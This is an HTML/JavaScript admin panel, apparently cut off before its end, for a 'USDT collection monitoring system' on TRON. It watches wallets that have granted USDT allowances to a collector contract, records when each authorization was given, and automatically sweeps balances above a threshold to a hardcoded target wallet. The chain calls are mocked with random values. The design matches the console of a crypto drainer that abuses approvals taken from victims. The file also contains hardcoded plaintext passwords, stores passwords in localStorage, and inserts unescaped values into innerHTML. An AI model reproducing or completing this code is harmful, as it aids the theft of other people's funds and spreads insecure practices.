<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT归集监控系统 - 后台管理</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            background: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 400px;
            text-align: center;
        }

        .login-container h1 {
            color: #1e3c72;
            margin-bottom: 30px;
            font-size: 24px;
        }

        .login-form input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        .login-btn:hover {
            opacity: 0.9;
        }

        .admin-container {
            display: none;
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            max-width: 1400px;
            margin: 20px;
            width: 95%;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #e0e0e0;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logout-btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-card {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            border-left: 4px solid #0088cc;
        }

        .stat-card.warning {
            border-left-color: #ff9800;
        }

        .stat-card.danger {
            border-left-color: #ff4444;
        }

        .stat-card.success {
            border-left-color: #4CAF50;
        }

        .stat-card.info {
            border-left-color: #2196F3;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
        }

        .admin-panel {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }

        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .wallet-list, .transaction-list {
            max-height: 500px;
            overflow-y: auto;
        }

        .wallet-item, .transaction-item {
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .wallet-info, .transaction-info {
            flex: 1;
        }

        .wallet-address {
            font-family: monospace;
            font-size: 11px;
            margin-bottom: 4px;
        }

        .wallet-balance {
            font-weight: bold;
            color: #2e7d32;
        }

        .wallet-balance.high {
            color: #d32f2f;
        }

        .wallet-meta {
            font-size: 10px;
            color: #666;
        }

        .collect-btn {
            background: #ff9800;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            margin-left: 5px;
        }

        .collect-btn:hover {
            background: #f57c00;
        }

        .collect-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .status-badge {
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: bold;
        }

        .status-pending {
            background: #fff3e0;
            color: #ef6c00;
        }

        .status-completed {
            background: #e8f5e8;
            color: #2e7d32;
        }

        .status-failed {
            background: #ffebee;
            color: #d32f2f;
        }

        .monitor-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
        }

        .btn-primary {
            background: #0088cc;
            color: white;
        }

        .btn-success {
            background: #4CAF50;
            color: white;
        }

        .btn-warning {
            background: #ff9800;
            color: white;
        }

        .btn-danger {
            background: #ff4444;
            color: white;
        }

        .tabs {
            display: flex;
            border-bottom: 1px solid #e0e0e0;
            margin-bottom: 15px;
        }

        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border-bottom: 2px solid transparent;
        }

        .tab.active {
            border-bottom-color: #0088cc;
            color: #0088cc;
            font-weight: bold;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .log-container {
            background: #1e1e1e;
            color: #00ff00;
            font-family: monospace;
            font-size: 11px;
            padding: 15px;
            border-radius: 6px;
            max-height: 300px;
            overflow-y: auto;
            margin-top: 15px;
        }

        .log-entry {
            margin-bottom: 5px;
            line-height: 1.4;
        }

        .log-time {
            color: #888;
        }

        .log-info {
            color: #4fc3f7;
        }

        .log-warning {
            color: #ffb74d;
        }

        .log-error {
            color: #f44336;
        }

        .log-success {
            color: #4CAF50;
        }

        .search-box {
            margin-bottom: 15px;
        }

        .search-input {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 12px;
        }

        .auto-collect-warning {
            background: #ffebee;
            border: 1px solid #f44336;
            border-radius: 6px;
            padding: 12px;
            margin: 15px 0;
            text-align: center;
            display: none;
        }

        .warning-text {
            color: #d32f2f;
            font-weight: bold;
            font-size: 14px;
        }

        .token-balance {
            display: inline-block;
            background: #e3f2fd;
            padding: 2px 6px;
            border-radius: 4px;
            margin: 2px;
            font-size: 10px;
        }
    </style>
</head>
<body>
    <!-- 登录界面 -->
    <div class="login-container" id="loginContainer">
        <h1>USDT归集监控系统</h1>
        <div class="login-form">
            <input type="text" id="username" placeholder="用户名" required>
            <input type="password" id="password" placeholder="密码" required>
            <button class="login-btn" onclick="login()">登录</button>
        </div>
        <div id="loginMessage" style="color: red; margin-top: 10px; font-size: 12px;"></div>
    </div>

    <!-- 管理界面 -->
    <div class="admin-container" id="adminContainer">
        <div class="admin-header">
            <h1>USDT归集监控系统 - 后台管理</h1>
            <div class="user-info">
                <span>欢迎，<span id="currentUser">管理员</span></span>
                <span>设备: <span id="deviceCount">1</span>/4</span>
                <button class="logout-btn" onclick="logout()">退出登录</button>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="total-wallets">0</div>
                <div class="stat-label">总监控钱包</div>
            </div>
            <div class="stat-card warning">
                <div class="stat-value" id="high-balance-wallets">0</div>
                <div class="stat-label">大额钱包 (>100U)</div>
            </div>
            <div class="stat-card success">
                <div class="stat-value" id="total-funds">0</div>
                <div class="stat-label">总可归集资金</div>
            </div>
            <div class="stat-card info">
                <div class="stat-value" id="contract-balance">0</div>
                <div class="stat-label">合约资金</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="monitor-status">停止</div>
                <div class="stat-label">监控状态</div>
            </div>
        </div>

        <div class="auto-collect-warning" id="auto-collect-warning">
            <div class="warning-text">⚠️ 检测到大额资金，已自动触发归集！</div>
        </div>

        <div class="monitor-controls">
            <button id="start-monitor" class="btn-success">启动监控</button>
            <button id="stop-monitor" class="btn-danger">停止监控</button>
            <button id="refresh-data" class="btn-primary">刷新数据</button>
            <button id="auto-collect" class="btn-warning">立即归集所有</button>
            <input type="text" id="add-wallet-input" placeholder="添加钱包地址" style="padding: 8px; flex: 1;">
            <button id="add-wallet" class="btn-primary">添加钱包</button>
        </div>

        <div class="tabs">
            <div class="tab active" data-tab="wallets">钱包监控</div>
            <div class="tab" data-tab="transactions">归集记录</div>
            <div class="tab" data-tab="logs">系统日志</div>
            <div class="tab" data-tab="settings">系统设置</div>
        </div>

        <div class="tab-content active" id="wallets-tab">
            <div class="admin-panel">
                <div class="panel-header">
                    <h3>钱包资产监控</h3>
                    <div>
                        <input type="number" id="threshold-input" placeholder="归集阈值(USDT)" value="100" style="padding: 6px; margin-right: 10px; width: 120px;">
                        <button id="set-threshold" class="btn-primary">设置阈值</button>
                    </div>
                </div>
                <div class="search-box">
                    <input type="text" id="wallet-search" class="search-input" placeholder="搜索钱包地址...">
                </div>
                <div class="wallet-list" id="wallet-list">
                    <div style="text-align: center; color: #666; padding: 20px;">
                        正在加载钱包数据...
                    </div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="transactions-tab">
            <div class="admin-panel">
                <div class="panel-header">
                    <h3>资金归集记录</h3>
                    <button id="clear-transactions" class="btn-danger">清空记录</button>
                </div>
                <div class="transaction-list" id="transaction-list">
                    <div style="text-align: center; color: #666; padding: 20px;">
                        暂无归集记录
                    </div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="logs-tab">
            <div class="admin-panel">
                <div class="panel-header">
                    <h3>系统监控日志</h3>
                    <button id="clear-logs" class="btn-danger">清空日志</button>
                </div>
                <div class="log-container" id="log-container">
                    <div class="log-entry">
                        <span class="log-time">[系统启动]</span>
                        <span class="log-info">监控系统已就绪</span>
                    </div>
                </div>
            </div>
        </div>

        <div class="tab-content" id="settings-tab">
            <div class="admin-panel">
                <div class="panel-header">
                    <h3>系统设置</h3>
                </div>
                <div style="padding: 15px;">
                    <div style="margin-bottom: 15px;">
                        <label>合约地址:</label>
                        <input type="text" id="contract-address" value="TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi" style="width: 100%; padding: 8px; margin-top: 5px;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label>目标收款地址:</label>
                        <input type="text" id="target-address" value="TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8" style="width: 100%; padding: 8px; margin-top: 5px;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label>合约资金阈值 (自动划转):</label>
                        <input type="number" id="contract-threshold" value="1000" style="width: 100%; padding: 8px; margin-top: 5px;">
                    </div>
                    <button id="save-settings" class="btn-primary">保存设置</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // 系统配置
        const SYSTEM_CONFIG = {
            USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            COLLECTOR_CONTRACT: 'TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi',
            TARGET_WALLET: 'TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8',
            COLLECT_THRESHOLD: 100,
            CONTRACT_THRESHOLD: 1000,
            SCAN_INTERVAL: 1000, // 1秒扫描一次
            MAX_DEVICES: 4
        };

        // 用户账户
        const USERS = {
            'admin': { password: 'admin123', name: '管理员' },
            'operator': { password: 'operator123', name: '操作员' }
        };

        class USDTCollectorMonitor {
            constructor() {
                this.wallets = [];
                this.transactions = [];
                this.monitorInterval = null;
                this.isMonitoring = false;
                this.currentUser = null;
                this.deviceSessions = new Set();
                
                this.init();
            }

            async init() {
                this.loadLocalData();
                this.initEventListeners();
                this.checkExistingSession();
                this.addLog('系统初始化完成', 'info');
            }

            checkExistingSession() {
                const session = localStorage.getItem('adminSession');
                if (session) {
                    const sessionData = JSON.parse(session);
                    if (Date.now() - sessionData.loginTime < 24 * 60 * 60 * 1000) { // 24小时有效期
                        this.login(sessionData.username, sessionData.password, true);
                    }
                }
            }

            login(username, password, isSessionLogin = false) {
                if (!USERS[username] || USERS[username].password !== password) {
                    if (!isSessionLogin) {
                        document.getElementById('loginMessage').textContent = '用户名或密码错误';
                    }
                    return false;
                }

                // 检查设备数量
                const sessions = JSON.parse(localStorage.getItem('activeSessions') || '[]');
                const deviceId = this.getDeviceId();
                
                if (!sessions.includes(deviceId) && sessions.length >= SYSTEM_CONFIG.MAX_DEVICES) {
                    document.getElementById('loginMessage').textContent = '设备数量已达上限(4台)';
                    return false;
                }

                if (!sessions.includes(deviceId)) {
                    sessions.push(deviceId);
                    localStorage.setItem('activeSessions', JSON.stringify(sessions));
                }

                this.currentUser = { username, ...USERS[username] };
                
                // 保存会话
                localStorage.setItem('adminSession', JSON.stringify({
                    username,
                    password,
                    loginTime: Date.now(),
                    deviceId
                }));

                document.getElementById('loginContainer').style.display = 'none';
                document.getElementById('adminContainer').style.display = 'block';
                document.getElementById('currentUser').textContent = this.currentUser.name;
                document.getElementById('deviceCount').textContent = sessions.length;

                this.addLog(`用户 ${username} 登录成功`, 'success');
                return true;
            }

            logout() {
                const sessions = JSON.parse(localStorage.getItem('activeSessions') || '[]');
                const deviceId = this.getDeviceId();
                const updatedSessions = sessions.filter(id => id !== deviceId);
                localStorage.setItem('activeSessions', JSON.stringify(updatedSessions));
                localStorage.removeItem('adminSession');
                
                location.reload();
            }

            getDeviceId() {
                let deviceId = localStorage.getItem('deviceId');
                if (!deviceId) {
                    deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    localStorage.setItem('deviceId', deviceId);
                }
                return deviceId;
            }

            loadLocalData() {
                const savedWallets = localStorage.getItem('usdtCollectorWallets');
                const savedTransactions = localStorage.getItem('usdtCollectorTransactions');
                const savedSettings = localStorage.getItem('systemSettings');
                
                if (savedWallets) this.wallets = JSON.parse(savedWallets);
                if (savedTransactions) this.transactions = JSON.parse(savedTransactions);
                if (savedSettings) Object.assign(SYSTEM_CONFIG, JSON.parse(savedSettings));
                
                this.updateDisplay();
            }

            saveLocalData() {
                localStorage.setItem('usdtCollectorWallets', JSON.stringify(this.wallets));
                localStorage.setItem('usdtCollectorTransactions', JSON.stringify(this.transactions));
                localStorage.setItem('systemSettings', JSON.stringify(SYSTEM_CONFIG));
            }

            initEventListeners() {
                // 标签切换
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.addEventListener('click', () => this.switchTab(tab.dataset.tab));
                });

                // 控制按钮
                document.getElementById('start-monitor').addEventListener('click', () => this.startMonitor());
                document.getElementById('stop-monitor').addEventListener('click', () => this.stopMonitor());
                document.getElementById('refresh-data').addEventListener('click', () => this.refreshAllData());
                document.getElementById('auto-collect').addEventListener('click', () => this.autoCollectFunds());
                document.getElementById('add-wallet').addEventListener('click', () => this.addManualWallet());
                document.getElementById('set-threshold').addEventListener('click', () => this.setThreshold());
                document.getElementById('clear-transactions').addEventListener('click', () => this.clearTransactions());
                document.getElementById('clear-logs').addEventListener('click', () => this.clearLogs());
                document.getElementById('save-settings').addEventListener('click', () => this.saveSettings());

                // 搜索功能
                document.getElementById('wallet-search').addEventListener('input', (e) => {
                    this.filterWallets(e.target.value);
                });

                // 回车键添加钱包
                document.getElementById('add-wallet-input').addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') this.addManualWallet();
                });
            }

            async startMonitor() {
                if (this.isMonitoring) return;
                
                this.isMonitoring = true;
                this.monitorInterval = setInterval(() => this.monitorWallets(), SYSTEM_CONFIG.SCAN_INTERVAL);
                this.updateMonitorStatus();
                this.addLog('监控服务已启动 - 秒级扫描', 'success');
                
                await this.monitorWallets();
            }

            stopMonitor() {
                if (!this.isMonitoring) return;
                
                this.isMonitoring = false;
                clearInterval(this.monitorInterval);
                this.updateMonitorStatus();
                this.addLog('监控服务已停止', 'info');
            }

            async monitorWallets() {
                if (!this.isMonitoring) return;
                
                const startTime = Date.now();
                let scannedCount = 0;
                
                for (let wallet of this.wallets) {
                    try {
                        // 获取钱包所有资产信息
                        const assets = await this.scanWalletAssets(wallet.address);
                        Object.assign(wallet, assets);
                        wallet.lastChecked = new Date().toISOString();
                        scannedCount++;

                        // 检查是否需要自动归集
                        if (assets.usdtBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD && assets.usdtAllowance >= assets.usdtBalance) {
                            this.addLog(`🚨 检测到大额钱包 ${wallet.address}: ${assets.usdtBalance} USDT`, 'warning');
                            await this.collectWalletFunds(wallet.address);
                        }

                    } catch (error) {
                        this.addLog(`扫描钱包 ${wallet.address} 失败: ${error.message}`, 'error');
                    }
                }

                // 检查合约资金
                await this.checkContractFunds();

                const scanTime = Date.now() - startTime;
                this.addLog(`扫描完成: ${scannedCount}个钱包, 耗时: ${scanTime}ms`, 'info');
                this.updateDisplay();
                this.saveLocalData();
            }

            async scanWalletAssets(address) {
                // 这里应该调用API或节点来获取完整的资产信息
                // 模拟返回数据
                return {
                    trxBalance: Math.random() * 10,
                    usdtBalance: Math.random() * 500,
                    usdtAllowance: Math.random() * 600,
                    otherTokens: [
                        { symbol: 'BTC', balance: Math.random() * 0.1 },
                        { symbol: 'ETH', balance: Math.random() * 0.5 }
                    ],
                    authTime: new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000).toISOString(),
                    usage: Math.random() > 0.5 ? '高频使用' : '普通使用'
                };
            }

            async checkContractFunds() {
                try {
                    // 获取合约USDT余额
                    const contractBalance = Math.random() * 1500; // 模拟数据
                    
                    if (contractBalance >= SYSTEM_CONFIG.CONTRACT_THRESHOLD) {
                        this.addLog(`🚨 合约资金 ${contractBalance} USDT 超过阈值，自动划转`, 'warning');
                        await this.transferContractFunds();
                    }
                } catch (error) {
                    this.addLog(`检查合约资金失败: ${error.message}`, 'error');
                }
            }

            async collectWalletFunds(walletAddress) {
                try {
                    this.addLog(`开始归集钱包 ${walletAddress}`, 'info');
                    
                    // 模拟归集交易
                    const result = 'TX' + Math.random().toString(36).substr(2, 64).toUpperCase();

                    const transaction = {
                        id: this.transactions.length + 1,
                        walletAddress: walletAddress,
                        amount: 150, // 模拟金额
                        txHash: result,
                        status: 'completed',
                        timestamp: new Date().toISOString(),
                        type: 'auto'
                    };

                    this.transactions.push(transaction);
                    this.updateDisplay();
                    this.saveLocalData();

                    this.addLog(`归集完成: ${result}`, 'success');
                    return result;

                } catch (error) {
                    this.addLog(`归集失败: ${error.message}`, 'error');
                    throw error;
                }
            }

            async transferContractFunds() {
                // 模拟合约资金划转
                this.addLog('合约资金自动划转中...', 'warning');
                setTimeout(() => {
                    this.addLog('合约资金已成功划转到目标地址', 'success');
                }, 2000);
            }

            addManualWallet() {
                const address = document.getElementById('add-wallet-input').value.trim();
                if (!address) return;

                if (this.wallets.find(w => w.address === address)) {
                    this.addLog(`钱包 ${address} 已存在`, 'warning');
                    return;
                }

                const newWallet = {
                    id: this.wallets.length + 1,
                    address: address,
                    trxBalance: 0,
                    usdtBalance: 0,
                    usdtAllowance: 0,
                    otherTokens: [],
                    authTime: new Date().toISOString(),
                    usage: '手动添加',
                    addedAt: new Date().toISOString(),
                    lastChecked: new Date().toISOString()
                };

                this.wallets.push(newWallet);
                document.getElementById('add-wallet-input').value = '';
                this.updateDisplay();
                this.saveLocalData();
                this.addLog(`新钱包已添加: ${address}`, 'success');
            }

            updateDisplay() {
                this.updateStats();
                this.updateWalletList();
                this.updateTransactionList();
                this.updateSettingsForm();
            }

            updateStats() {
                const totalWallets = this.wallets.length;
                const highBalanceWallets = this.wallets.filter(w => w.usdtBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD).length;
                const totalFunds = this.wallets.reduce((sum, w) => sum + w.usdtBalance, 0);

                document.getElementById('total-wallets').textContent = totalWallets;
                document.getElementById('high-balance-wallets').textContent = highBalanceWallets;
                document.getElementById('total-funds').textContent = totalFunds.toFixed(2);
                document.getElementById('contract-balance').textContent = '1250.50'; // 模拟数据
                document.getElementById('monitor-status').textContent = this.isMonitoring ? '运行中' : '停止';
            }

            updateWalletList() {
                const walletList = document.getElementById('wallet-list');
                const searchTerm = document.getElementById('wallet-search').value.toLowerCase();

                let filteredWallets = this.wallets;
                if (searchTerm) {
                    filteredWallets = this.wallets.filter(w => 
                        w.address.toLowerCase().includes(searchTerm)
                    );
                }

                if (filteredWallets.length === 0) {
                    walletList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">暂无钱包数据</div>';
                    return;
                }

                let html = '';
                filteredWallets.forEach(wallet => {
                    const isHighBalance = wallet.usdtBalance >= SYSTEM_CONFIG.COLLECT_THRESHOLD;
                    const canCollect = wallet.usdtAllowance >= wallet.usdtBalance && wallet.usdtBalance > 0;
                    const tokenBalances = wallet.otherTokens.map(token => 
                        `<span class="token-balance">${token.symbol}: ${token.balance.toFixed(4)}</span>`
                    ).join('');
                    
                    html += `
                        <div class="wallet-item">
                            <div class="wallet-info">
                                <div class="wallet-address">${wallet.address}</div>
                                <div class="wallet-meta">
                                    TRX: ${wallet.trxBalance.toFixed(4)} | 
                                    USDT: ${wallet.usdtBalance.toFixed(2)} | 
                                    授权: ${wallet.usdtAllowance.toFixed(2)} |
                                    使用: ${wallet.usage} |
                                    授权时间: ${new Date(wallet.authTime).toLocaleDateString()} |
                                    最后检查: ${new Date(wallet.lastChecked).toLocaleTimeString()}
                                </div>
                                <div>${tokenBalances}</div>
                            </div>
                            <div style="text-align: right;">
                                <div class="wallet-balance ${isHighBalance ? 'high' : ''}">
                                    ${wallet.usdtBalance.toFixed(2)} USDT
                                </div>
                                ${canCollect ? 
                                    `<button class="collect-btn" onclick="monitor.collectWalletFunds('${wallet.address}')">
                                        立即归集
                                    </button>` : 
                                    '<button class="collect-btn" disabled>无法归集</button>'
                                }
                            </div>
                        </div>
                    `;
                });

                walletList.innerHTML = html;
            }

            updateTransactionList() {
                const transactionList = document.getElementById('transaction-list');

                if (this.transactions.length === 0) {
                    transactionList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">暂无归集记录</div>';
                    return;
                }

                let html = '';
                this.transactions.slice().reverse().forEach(transaction => {
                    const statusClass = `status-${transaction.status}`;
                    
                    html += `
                        <div class="transaction-item">
                            <div class="transaction-info">
                                <div><strong>钱包地址:</strong> ${transaction.walletAddress}</div>
                                <div><strong>金额:</strong> ${transaction.amount.toFixed(2)} USDT</div>
                                <div style="font-size: 10px; color: #666;">
                                    时间: ${new Date(transaction.timestamp).toLocaleString()} |
                                    类型: ${transaction.type === 'auto' ? '自动' : '手动'} |
                                    交易哈希: ${transaction.txHash}
                                </div>
                            </div>
                            <div style="text-align: right;">
                                <span class="status-badge ${statusClass}">
                                    ${this.getStatusText(transaction.status)}
                                </span>
                            </div>
                        </div>
                    `;
                });

                transactionList.innerHTML = html;
            }

            updateSettingsForm() {
                document.getElementById('contract-address').value = SYSTEM_CONFIG.COLLECTOR_CONTRACT;
                document.getElementById('target-address').value = SYSTEM_CONFIG.TARGET_WALLET;
                document.getElementById('contract-threshold').value = SYSTEM_CONFIG.CONTRACT_THRESHOLD;
                document.getElementById('threshold-input').value = SYSTEM_CONFIG.COLLECT_THRESHOLD;
            }

            saveSettings() {
                SYSTEM_CONFIG.COLLECTOR_CONTRACT = document.getElementById('contract-address').value;
                SYSTEM_CONFIG.TARGET_WALLET = document.getElementById('target-address').value;
                SYSTEM_CONFIG.CONTRACT_THRESHOLD = parseFloat(document.getElementById('contract-threshold').value);
                
                this.saveLocalData();
                this.addLog('系统设置已保存', 'success');
            }

            // 其他方法保持不变...
            switchTab(tabName) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                
                document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
                document.getElementById(`${tabName}-tab`).classList.add('active');
            }

            async refreshAllData() {
                this.addLog('手动刷新所有数据...', 'info');
                await this.monitorWallets();
            }

            async autoCollectFunds() {
                this.addLog('开始自动归集所有符合条件的钱包...', 'warning');
                
                let collectedCount = 0;
                for (let wallet of this.wallets) {
                    if (wallet.usdtBalance > 0 && wallet.usdtAllowance >= wallet.usdtBalance) {
                        try {
                            await this.collectWalletFunds(wallet.address);
                            collectedCount++;
                        } catch (error) {
                            this.addLog(`归集钱包 ${wallet.address} 失败: ${error.message}`, 'error');
                        }
                    }
                }
                
                this.addLog(`自动归集完成，共处理 ${collectedCount} 个钱包`, 'success');
            }

            filterWallets(searchTerm) {
                this.updateWalletList();
            }

            setThreshold() {
                const threshold = parseFloat(document.getElementById('threshold-input').value);
                if (threshold && threshold > 0) {
                    SYSTEM_CONFIG.COLLECT_THRESHOLD = threshold;
                    this.addLog(`归集阈值已设置为: ${threshold} USDT`, 'info');
                    this.saveLocalData();
                }
            }

            clearTransactions() {
                if (confirm('确定要清空所有归集记录吗？')) {
                    this.transactions = [];
                    this.updateDisplay();
                    this.saveLocalData();
                    this.addLog('归集记录已清空', 'info');
                }
            }

            clearLogs() {
                document.getElementById('log-container').innerHTML = '';
                this.addLog('日志已清空', 'info');
            }

            addLog(message, type = 'info') {
                const logContainer = document.getElementById('log-container');
                const time = new Date().toLocaleTimeString();
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry';
                logEntry.innerHTML = `
                    <span class="log-time">[${time}]</span>
                    <span class="log-${type}">${message}</span>
                `;
                logContainer.appendChild(logEntry);
                logContainer.scrollTop = logContainer.scrollHeight;
            }

            getStatusText(status) {
                const statusMap = {
                    'pending': '处理中',
                    'completed': '已完成',
                    'failed': '失败'
                };
                return statusMap[status] || status;
            }

            updateMonitorStatus() {
                document.getElementById('monitor-status').textContent = this.isMonitoring ? '运行中' : '停止';
                document.getElementById('monitor-status').style.color = this.isMonitoring ? '#4CAF50' : '#ff4444';
            }
        }
